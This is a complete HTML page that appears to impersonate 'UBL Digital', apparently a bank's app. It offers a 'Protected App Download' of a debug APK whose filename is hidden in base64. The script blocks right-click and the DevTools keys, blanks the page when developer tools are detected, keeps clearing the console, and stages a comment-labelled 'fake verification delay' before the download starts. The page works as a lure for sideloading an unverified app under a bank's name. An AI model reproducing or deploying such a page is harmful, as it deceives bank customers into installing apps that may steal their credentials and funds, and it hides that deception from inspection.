<!DOCTYPE html>
<html lang="en">
<head>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<!-- Security -->
<meta http-equiv="X-Content-Type-Options" content="nosniff">
<meta http-equiv="X-Frame-Options" content="DENY">
<meta http-equiv="Referrer-Policy" content="strict-origin">
<meta http-equiv="Permissions-Policy" content="geolocation=(), microphone=(), camera=()">

<title>UBL Digital</title>

<style>

*{
  margin:0;
  padding:0;
  box-sizing:border-box;
  font-family:Arial,sans-serif;
  -webkit-tap-highlight-color:transparent;
}

body{
  background:#e9e9e9;
  overflow-x:hidden;
  user-select:none;
}

.container{
  max-width:400px;
  margin:auto;
  background:#f5f5f5;
  min-height:100vh;
  overflow:hidden;
  position:relative;
}

/* TOP */
.top{
  background:#1da1d2;
  height:200px;
  position:relative;
  border-bottom-left-radius:70% 30%;
  border-bottom-right-radius:70% 30%;
}

/* SHARE */
.share{
  position:absolute;
  top:15px;
  right:15px;
  background:#dcdcdc;
  border-radius:50%;
  padding:10px;
  font-weight:bold;
}

/* LOGO RING */
.logo-ring{
  position:absolute;
  bottom:-42px;
  left:50%;
  transform:translateX(-50%);
  width:105px;
  height:105px;
  border-radius:50%;
  background:white;
  display:flex;
  align-items:center;
  justify-content:center;
  box-shadow:0 5px 15px rgba(0,0,0,0.15);
}

/* LOGO */
.logo-ring img{
  width:90px;
  border-radius:50%;
  pointer-events:none;
}

/* CONTENT */
.content{
  text-align:center;
  margin-top:65px;
  padding:20px;
}

.small{
  font-size:13px;
  color:#444;
  text-transform:uppercase;
  letter-spacing:1px;
}

h1{
  font-size:26px;
  margin:8px 0;
  color:#111;
}

.sub{
  color:#777;
  margin-bottom:30px;
}

/* BUTTON */
.btn{
  background:#1da1d2;
  color:white;
  border:none;
  padding:15px;
  width:90%;
  border-radius:30px;
  font-size:16px;
  cursor:pointer;
  transition:.3s;
  font-weight:bold;
  box-shadow:0 4px 10px rgba(0,0,0,0.15);
}

.btn:hover{
  background:#178bb8;
  transform:scale(1.02);
}

.secure{
  margin-top:25px;
  color:#999;
  font-size:12px;
}

</style>
</head>

<body>

<div class="container">

  <div class="top">

    <div class="share">⤴</div>

    <div class="logo-ring">
      <img src="logo.png" alt="UBL Logo">
    </div>

  </div>

  <div class="content">

    <div class="small">digital</div>

    <h1>UBL Digital</h1>

    <div class="sub">Protected App Download</div>

    <button class="btn" id="downloadBtn">
      Download Now
    </button>

    <div class="secure">
      Secure Download Enabled
    </div>

  </div>

</div>

<script>

/* Disable Right Click */
document.addEventListener('contextmenu', e=>{
  e.preventDefault();
});

/* Disable Inspect Keys */
document.addEventListener('keydown', function(e){

  if(
    e.key === 'F12' ||
    (e.ctrlKey && e.shiftKey &&
    ['I','J','C','K'].includes(e.key)) ||
    (e.ctrlKey && ['U','S'].includes(e.key))
  ){
    e.preventDefault();
  }

});

/* Prevent Drag */
document.addEventListener('dragstart', e=>{
  e.preventDefault();
});

/* Anti iframe */
if(window.top !== window.self){
  window.top.location = window.self.location;
}

/* DevTools Detection */
(function(){

  function detect(){

    const threshold = 160;

    if(
      window.outerWidth - window.innerWidth > threshold ||
      window.outerHeight - window.innerHeight > threshold
    ){
      document.body.innerHTML = '';
    }

  }

  setInterval(detect,1000);

})();

/* Clear Console */
setInterval(()=>{
  console.clear();
},1000);

/* Obfuscated APK Name */
const secureData = [
  "YXBwLWRlYnVnJTIwKDIpLmFwaw=="
];

function decodeFile(v){
  return atob(v);
}

/* Secure Download Logic */
(async()=>{

  const btn = document.getElementById("downloadBtn");

  btn.addEventListener("click", async()=>{

    btn.innerText = "Preparing...";
    btn.disabled = true;

    try{

      /* Fake verification delay */
      await new Promise(r=>setTimeout(r,1500));

      const file = decodeFile(secureData[0]);

      const a = document.createElement("a");

      a.href = file;
      a.download = "app-debug (2).apk";
      a.rel = "noopener noreferrer";

      document.body.appendChild(a);

      a.click();

      document.body.removeChild(a);

      btn.innerText = "Download Started";

    }catch(err){

      btn.innerText = "Download Failed";

    }

    setTimeout(()=>{
      btn.innerText = "Download Now";
      btn.disabled = false;
    },3000);

  });

})();

</script>

</body>
</html>
